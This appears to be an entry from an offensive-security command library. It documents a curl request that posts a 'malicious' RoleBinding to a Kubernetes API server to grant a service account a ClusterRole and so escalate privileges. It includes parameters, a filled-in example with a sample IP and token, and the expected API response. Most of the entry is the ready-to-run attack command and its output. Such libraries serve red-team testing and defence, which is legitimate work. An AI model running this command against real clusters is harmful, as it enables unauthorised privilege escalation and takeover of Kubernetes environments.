---
id: 5dc41420-2f26-48b3-8539-c7bd720b0cd6
name: curl-create-malicious-rolebinding
type: command
executor: bash
data: >-
  curl -k -v -X POST -H "Authorization: Bearer <JWT_TOKEN>" -H "Content-Type:
  application/json"
  https://<master_ip>:<port>/apis/rbac.authorization.k8s.io/v1/namespaces/default/rolebindings
  -d @malicious-rolebinding.json
output: null
created_at: '2023-04-06T03:56:01.304843+00:00'
updated_at: '2023-04-10T20:34:00.646741+00:00'
platforms:
  - Kubernetes
tags:
  - rbac
  - privilege-escalation
verified: true
validated: true
---

# curl-create-malicious-rolebinding

## Command

```bash
curl -k -v -X POST -H "Authorization: Bearer <JWT_TOKEN>" -H "Content-Type: application/json" https://<master_ip>:<port>/apis/rbac.authorization.k8s.io/v1/namespaces/default/rolebindings -d @malicious-rolebinding.json
```

## Description

This command uses curl to create a RoleBinding in the Kubernetes default namespace by posting a JSON manifest file. It authenticates via a JWT bearer token and targets the RBAC API endpoint to bind a ClusterRole to a service account, enabling privilege escalation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| <JWT_TOKEN> | Valid JWT token for an account with RoleBinding creation permissions | Yes |
| <master_ip> | IP address of the Kubernetes API server | Yes |
| <port> | Port of the API server (default 6443) | Yes |
| @malicious-rolebinding.json | Path to the JSON manifest file defining the RoleBinding | Yes |
| -k | Skip SSL certificate verification (use only in lab environments) | No |
| -v | Verbose output for debugging | No |

## Examples

### Basic Usage

```bash
curl -k -v -X POST -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..." -H "Content-Type: application/json" https://192.168.1.100:6443/apis/rbac.authorization.k8s.io/v1/namespaces/default/rolebindings -d @malicious-rolebinding.json
```

### Advanced Usage

Add --fail to exit on HTTP errors:

```bash
curl -k -v -X POST --fail -H "Authorization: Bearer <JWT_TOKEN>" -H "Content-Type: application/json" https://<master_ip>:<port>/apis/rbac.authorization.k8s.io/v1/namespaces/default/rolebindings -d @malicious-rolebinding.json
```

## Expected Output

Successful creation returns HTTP 201 Created with the RoleBinding resource:

```
{
  "apiVersion": "rbac.authorization.k8s.io/v1",
  "kind": "RoleBinding",
  "metadata": {
    "creationTimestamp": "2023-04-06T03:56:01Z",
    "name": "malicious-rolebinding",
    "namespace": "default",
    "resourceVersion": "12345",
    "uid": "abc123-def456"
  },
  "roleRef": {
    "apiGroup": "*",
    "kind": "ClusterRole",
    "name": "admin"
  },
  "subjects": [
    {
      "kind": "ServiceAccount",
      "name": "sa-comp",
      "namespace": "default"
    }
  ]
}
```
Error (e.g., 403 Forbidden) indicates insufficient permissions.

## Related

- [[procedures/kubernetes-rbac-privilege-escalation-via-malicious-rolebinding]]
- [[commands/curl-create-kube-system-secret]]
